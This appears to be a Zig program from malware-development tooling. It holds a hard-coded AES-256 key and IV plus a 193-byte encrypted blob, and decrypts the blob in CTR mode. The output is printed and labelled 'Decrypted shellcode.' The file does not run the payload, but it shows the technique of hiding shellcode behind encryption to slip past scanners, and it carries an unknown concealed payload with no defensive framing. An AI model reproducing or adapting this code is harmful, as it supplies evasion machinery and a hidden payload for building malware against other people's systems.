const std = @import("std");

const AES_KEY: [32]u8 = [_]u8{
    0x04, 0xee, 0xe1, 0xfd, 0x02, 0xff, 0x23, 0xc7, 0xd4, 0xb3, 0x80, 0x64, 0x2c, 0x9a, 0xdb, 0xde, 
    0xd0, 0xa5, 0xd5, 0xc8, 0xd1, 0x18, 0xc0, 0x3f, 0x75, 0x02, 0xcd, 0x34, 0x39, 0x0a, 0x8a, 0x67
};

const AES_IV: [16]u8 = [_]u8{
    0xfc, 0x19, 0x06, 0xe2, 0xe0, 0xf2, 0x08, 0x48, 0xaf, 0x8e, 0x65, 0xf1, 0xc0, 0x4d, 0x76, 0x83
};

const AES_CIPHERTEXT: [193]u8 = [_]u8{
    0x52, 0xc3, 0x8b, 0x9b, 0x59, 0x34, 0xca, 0x8e, 0xfb, 0xb9, 0x59, 0xd5, 0x3f, 0x79, 0x7c, 0x59, 
    0x07, 0x63, 0xd4, 0xaa, 0xde, 0xe2, 0x8b, 0x76, 0xc3, 0x46, 0x47, 0xe9, 0xe1, 0x29, 0x11, 0x49, 
    0x4a, 0x92, 0x5b, 0x5c, 0x10, 0xbc, 0x7a, 0xad, 0x95, 0x75, 0x22, 0x4d, 0x83, 0x57, 0x89, 0xc7, 
    0x37, 0xd3, 0xe0, 0x01, 0xe0, 0x77, 0x54, 0x70, 0x64, 0x63, 0xcf, 0x62, 0xc7, 0xab, 0xe9, 0x49, 
    0x22, 0x73, 0x7f, 0x58, 0x64, 0xfa, 0x2c, 0xe6, 0x95, 0xae, 0x47, 0x22, 0xbc, 0xc7, 0x1c, 0xda, 
    0x41, 0x9e, 0x27, 0x3a, 0xaa, 0x1f, 0x32, 0xcf, 0x34, 0x84, 0x69, 0x09, 0x9e, 0x44, 0x9f, 0xf1, 
    0x82, 0x38, 0x4f, 0x1f, 0x03, 0xd9, 0x33, 0x0f, 0x20, 0xb7, 0x03, 0x9e, 0x28, 0x50, 0xe5, 0xd9, 
    0x8c, 0xdc, 0x90, 0x7b, 0x60, 0xaf, 0xd1, 0xda, 0x6b, 0x2b, 0xdf, 0x8e, 0xe4, 0x71, 0xee, 0x0b, 
    0xc8, 0xce, 0x0d, 0xfb, 0xc0, 0xf2, 0xd8, 0x99, 0x5d, 0x9a, 0xb8, 0x94, 0x19, 0x54, 0xb0, 0x39, 
    0xee, 0x1a, 0x6a, 0xa2, 0x64, 0x31, 0x98, 0x41, 0xaa, 0x7f, 0xa7, 0x6d, 0xac, 0x85, 0x26, 0x1c, 
    0x66, 0xb5, 0xc6, 0x8f, 0x2a, 0x95, 0xed, 0x72, 0x37, 0xc9, 0x0b, 0x9a, 0x42, 0x5d, 0xb2, 0xf5, 
    0x18, 0x7b, 0xb2, 0xde, 0xf9, 0x07, 0x48, 0xbf, 0x5f, 0x99, 0x36, 0x48, 0xc4, 0x38, 0x63, 0x84, 
    0xe7
};

fn aesDecryption(ciphertext: []u8, key: []const u8, iv: []const u8) !void {
    switch (key.len) {
        16 => {
            const key_array: [16]u8 = key[0..16].*;
            const ctx = std.crypto.core.aes.Aes128.initEnc(key_array);
            try aesDecryptWithContext(ciphertext, ctx, iv);
        },
        32 => {
            const key_array: [32]u8 = key[0..32].*;
            const ctx = std.crypto.core.aes.Aes256.initEnc(key_array);
            try aesDecryptWithContext(ciphertext, ctx, iv);
        },
        else => return error.InvalidKeyLength,
    }
}

fn aesDecryptWithContext(data: []u8, ctx: anytype, iv: []const u8) !void {
    // CTR mode decryption is same as encryption
    var counter: [16]u8 = undefined;
    @memcpy(&counter, iv);

    var offset: usize = 0;
    while (offset < data.len) {
        var keystream: [16]u8 = undefined;
        ctx.encrypt(&keystream, &counter);

        const block_size = @min(16, data.len - offset);
        for (0..block_size) |i| {
            data[offset + i] ^= keystream[i];
        }

        // Increment counter
        var carry: u16 = 1;
        var i: usize = 15;
        while (carry > 0 and i < 16) {
            carry += counter[i];
            counter[i] = @intCast(carry & 0xFF);
            carry >>= 8;
            if (i == 0) break;
            i -= 1;
        }

        offset += block_size;
    }
}

pub fn main() !void {
    var ciphertext = AES_CIPHERTEXT;
    try aesDecryption(&ciphertext, &AES_KEY, &AES_IV);
    std.debug.print("Decrypted shellcode length: {}\n", .{ciphertext.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{ciphertext});
}
